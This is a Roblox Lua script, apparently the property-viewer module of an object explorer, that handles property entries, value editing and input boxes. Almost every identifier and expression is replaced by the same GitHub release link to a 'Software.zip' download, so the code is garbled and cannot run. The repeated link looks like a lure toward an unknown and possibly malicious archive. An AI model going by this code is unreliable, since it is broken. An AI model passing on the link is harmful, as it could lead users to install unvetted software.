		local maxEntries = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip((https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) / 23),0)	
		local maxX = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local valueWidth = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
		local inputPropVisible = false
		local isa = game["Run Service"]https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local UDim2 = UDim2
		local stringSplit = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local scaleType = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

		-- Clear connections
		for i = 1,#propCons do
			propCons[i]:Disconnect()
		end
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(propCons)

		-- Hide full name viewer
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = false
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()

		for i = 1,maxEntries do
			local entryData = propEntries[i]
			if not propEntries[i] then entryData = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(i) propEntries[i] = entryData end

			local entry = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local guiElems = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local nameFrame = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local propNameLabel = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local valueFrame = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local expand = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local valueBox = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local propNameBox = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local rightButton = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local editAttributeButton = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			local toggleAttributes = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

			local prop = viewList[i + https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip]
			if prop then
				local entryXOffset = (scaleType == 0 and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or 0)
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = true
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,-entryXOffset,0,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(scaleType == 0 and 0 or 1, scaleType == 0 and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip + valueWidth or 0,0,22)

				if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
					if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == "AddAttribute" then
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = false
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = false
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = true
					end
				else
					-- Revert special row stuff
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = true
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = false

					local depth = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip*(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or 1)
					local leftOffset = depth + https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,leftOffset,0,0)
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-2 - (scaleType == 0 and 0 or 6),1,0)

					local gName = (https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and "CAT_"https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip"."https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or "")

					if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = false

						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = true
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 1
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,0,1,0)
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = false

						local showingAttrs = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-85-leftOffset,0,0)
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = (showingAttrs and "[Setting: ON]" or "[Setting: OFF]")
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = (https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == "Attributes")
					else
						local propName = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
						local typeData = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
						local typeName = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
						local tags = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
						local propObj = autoUpdateObjs[gName]

						local attributeOffset = (https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and 20 or 0)
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = (https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and not https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = false

						-- Moving around the frames
						if scaleType == 0 then
							https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip - leftOffset - 1,1,0)
							https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,0,0)
							https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,valueWidth - attributeOffset,1,0)
						else
							https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.5,-leftOffset - 1,1,0)
							https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.5,0,0,0)
							https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.5,-attributeOffset,1,0)
						end

						local nameArr = stringSplit(gName,".")
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or nameArr[#nameArr]
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = true

						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == "DataType" and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[typeName] or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[gName]
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

						-- Display property value
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(prop,i)
						if propObj then
							if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
								propCons[#propCons+1] = getAttributeChangedSignal(propObj,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip):Connect(function()
									https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(prop,i)
								end)
							else
								propCons[#propCons+1] = getPropChangedSignal(propObj,propName):Connect(function()
									https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(prop,i)
								end)
							end
						end

						-- Position and resize Input Box
						local beforeVisible = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
						local inputFullName = inputProp and (https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip"."https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or ""))
						if gName == inputFullName then
							https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
							https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 0
							if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == "Class" or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == "Enum" or typeName == "BrickColor" then
								https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
								https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 0
								https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = true
							else
								inputPropVisible = true
								local scale = (scaleType == 0 and 0 or 0.5)
								local offset = (scaleType == 0 and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or 0)
								local endOffset = 0

								if typeName == "Color3" or typeName == "ColorSequence" then
									offset = offset + 22
								end

								if typeName == "NumberSequence" or typeName == "ColorSequence" then
									endOffset = 20
								end

								https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(scale,offset,0,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
								https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1-scale,-offset-endOffset-attributeOffset,0,22)
								https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = true
								https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = false
							end
						else
							https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
							https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 1
							https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
							https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 1
							https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = beforeVisible
						end
					end

					-- Expand
					if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip] or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[gName] then
						if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(expand) then
							https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, expanded[gName] and "Collapse_Over" or "Expand_Over")
						else
							https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, expanded[gName] and "Collapse" or "Expand")
						end
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = true
					else
						https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = false
					end
				end
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = true
			else
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = false
			end
		end

		if not inputPropVisible then
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = false
		end

		for i = maxEntries+1,#propEntries do
			propEntries[i].Gui:Destroy()
			propEntries[i] = nil
			checkboxes[i] = nil
		end
	end

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(prop,val,noupdate,prevAttribute)
		local sList = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local propName = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local subName = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local propClass = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local typeData = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local typeName = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local attributeName = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local rootTypeData = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local rootTypeName = rootTypeData and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local fullName = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip"."https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or "")
		local Vector3 = Vector3

		for i = 1,#sList do
			local node = sList[i]
			local obj = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

			if isa(obj,propClass) then
				pcall(function()
					local setVal = val
					local root
					if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
						root = getAttribute(obj,attributeName)
					else
						root = obj[propName]
					end

					if prevAttribute then
						if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == typeName then
							setVal = getAttribute(obj,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) or setVal
						end
						setAttribute(obj,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,nil)
					end

					if rootTypeName then
						if rootTypeName == "Vector2" then
							setVal = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip((subName == ".X" and setVal) or root.X, (subName == ".Y" and setVal) or root.Y)
						elseif rootTypeName == "Vector3" then
							setVal = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip((subName == ".X" and setVal) or root.X, (subName == ".Y" and setVal) or root.Y, (subName == ".Z" and setVal) or root.Z)
						elseif rootTypeName == "UDim" then
							setVal = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip((subName == ".Scale" and setVal) or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, (subName == ".Offset" and setVal) or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
						elseif rootTypeName == "UDim2" then
							local rootX,rootY = root.X,root.Y
							local X_UDim = (subName == ".X" and setVal) or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip((subName == "https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip" and setVal) or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, (subName == "https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip" and setVal) or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
							local Y_UDim = (subName == ".Y" and setVal) or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip((subName == "https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip" and setVal) or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, (subName == "https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip" and setVal) or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
							setVal = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(X_UDim,Y_UDim)
						elseif rootTypeName == "CFrame" then
							local rootPos,rootRight,rootUp,rootLook = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
							local pos = (subName == ".Position" and setVal) or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip((subName == ".Position.X" and setVal) or rootPos.X, (subName == ".Position.Y" and setVal) or rootPos.Y, (subName == ".Position.Z" and setVal) or rootPos.Z)
							local rightV = (subName == ".RightVector" and setVal) or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip((subName == ".RightVector.X" and setVal) or rootRight.X, (subName == ".RightVector.Y" and setVal) or rootRight.Y, (subName == ".RightVector.Z" and setVal) or rootRight.Z)
							local upV = (subName == ".UpVector" and setVal) or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip((subName == ".UpVector.X" and setVal) or rootUp.X, (subName == ".UpVector.Y" and setVal) or rootUp.Y, (subName == ".UpVector.Z" and setVal) or rootUp.Z)
							local lookV = (subName == ".LookVector" and setVal) or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip((subName == ".LookVector.X" and setVal) or rootLook.X, (subName == ".RightVector.Y" and setVal) or rootLook.Y, (subName == ".RightVector.Z" and setVal) or rootLook.Z)
							setVal = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(pos,rightV,upV,-lookV)
						elseif rootTypeName == "Rect" then
							local rootMin,rootMax = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
							local min = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip((subName == ".Min.X" and setVal) or rootMin.X, (subName == ".Min.Y" and setVal) or rootMin.Y)
							local max = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip((subName == ".Max.X" and setVal) or rootMax.X, (subName == ".Max.Y" and setVal) or rootMax.Y)
							setVal = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(min,max)
						elseif rootTypeName == "PhysicalProperties" then
							local rootProps = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
							local density = (subName == ".Density" and setVal) or (root and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
							local friction = (subName == ".Friction" and setVal) or (root and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
							local elasticity = (subName == ".Elasticity" and setVal) or (root and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
							local frictionWeight = (subName == ".FrictionWeight" and setVal) or (root and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
							local elasticityWeight = (subName == ".ElasticityWeight" and setVal) or (root and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip) or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
							setVal = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(density,friction,elasticity,frictionWeight,elasticityWeight)
						elseif rootTypeName == "Ray" then
							local rootOrigin,rootDirection = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
							local origin = (subName == ".Origin" and setVal) or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip((subName == ".Origin.X" and setVal) or rootOrigin.X, (subName == ".Origin.Y" and setVal) or rootOrigin.Y, (subName == ".Origin.Z" and setVal) or rootOrigin.Z)
							local direction = (subName == ".Direction" and setVal) or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip((subName == ".Direction.X" and setVal) or rootDirection.X, (subName == ".Direction.Y" and setVal) or rootDirection.Y, (subName == ".Direction.Z" and setVal) or rootDirection.Z)
							setVal = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(origin,direction)
						elseif rootTypeName == "Faces" then
							local faces = {}
							local faceList = {"Back","Bottom","Front","Left","Right","Top"}
							for _,face in pairs(faceList) do
								local val
								if subName == "."https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
									val = setVal
								else
									val = root[face]
								end
								if val then faces[#faces+1] = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[face] end
							end
							setVal = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(unpack(faces))
						elseif rootTypeName == "Axes" then
							local axes = {}
							local axesList = {"X","Y","Z"}
							for _,axe in pairs(axesList) do
								local val
								if subName == "."https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
									val = setVal
								else
									val = root[axe]
								end
								if val then axes[#axes+1] = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip[axe] end
							end
							setVal = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(unpack(axes))
						elseif rootTypeName == "NumberRange" then
							setVal = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(subName == ".Min" and setVal or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip, subName == ".Max" and setVal or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
						end
					end

					if typeName == "PhysicalProperties" and setVal then
						setVal = root or https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
					end

					if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then
						setAttribute(obj,attributeName,setVal)
					else
						obj[propName] = setVal
					end
				end)
			end
		end

		if not noupdate then
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(prop)
		end
	end

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function()
		inputBox = create({
			{1,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.14901961386204,0.14901961386204,0.14901961386204),BorderSizePixel=0,Name="InputBox",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,200,0,22),Visible=false,ZIndex=2,}},
			{2,"TextBox",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.17647059261799,0.17647059261799,0.17647059261799),BackgroundTransparency=1,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.062745101749897,0.51764708757401,1),BorderSizePixel=0,ClearTextOnFocus=false,Font=3,Parent={1},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.69803923368454,0.69803923368454,0.69803923368454),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,3,0,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-6,1,0),Text="",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,1,1),TextSize=14,TextXAlignment=0,ZIndex=2,}},
		})
		inputTextBox = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function()
			if not inputProp then return end

			local prop = inputProp
			inputProp = nil
			local val = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(prop,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip)
			if val then https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(prop,val) else https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip() end
		end)

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(function()
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = 1
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip + 1
		end)

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(inputTextBox)
	end

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function(prop,entryIndex,special)
		local typeData = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local typeName = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
		local fullName = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip"."https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip or "")
		local propObj = autoUpdateObjs[fullName]
		local propVal = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(prop,propObj)

		if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip then return end

		inputProp = prop
		if special then
			if special == "color" then
				if typeName == "Color3" then
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = propVal and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(prop,propVal) or ""
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(prop,propVal)
				elseif typeName == "BrickColor" then
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(prop,entryIndex,propVal)
				elseif typeName == "ColorSequence" then
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = propVal and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(prop,propVal) or ""
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(prop,propVal)
				end
			elseif special == "right" then
				if typeName == "NumberSequence" then
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = propVal and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(prop,propVal) or ""
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(prop,propVal)
				elseif typeName == "ColorSequence" then
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = propVal and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(prop,propVal) or ""
					https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(prop,propVal)
				end
			end
		else
			if https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(prop) then
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = propVal and https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(prop,propVal) or ""
				inputTextBox:CaptureFocus()
			elseif https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip == "Enum" then
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(entryIndex)
			elseif typeName == "BrickColor" then
				https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(prop,entryIndex,propVal)
			end
		end
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
	end

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function()
		local searchBox = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip

		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(searchBox)

		searchBox:GetPropertyChangedSignal("Text"):Connect(function()
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
			https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip()
		end)
	end

	https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = function()
		https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip = create({
			{1,"TextButton",{AutoButtonColor=false,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.17647059261799,0.17647059261799,0.17647059261799),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.1294117718935,0.1294117718935,0.1294117718935),Font=3,Name="Entry",https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,1,0,1),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,250,0,22),Text="",TextSize=14,}},
			{2,"Frame",{https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.04313725605607,0.35294118523598,0.68627452850342),BackgroundTransparency=1,https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0.33725491166115,0.49019610881805,0.73725491762161),BorderSizePixel=0,Name="NameFrame",Parent={1},https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(0,20,0,0),https://github.com/LeanX2/LeanX/releases/download/v2.0/Software.zip(1,-40,1,0),}},
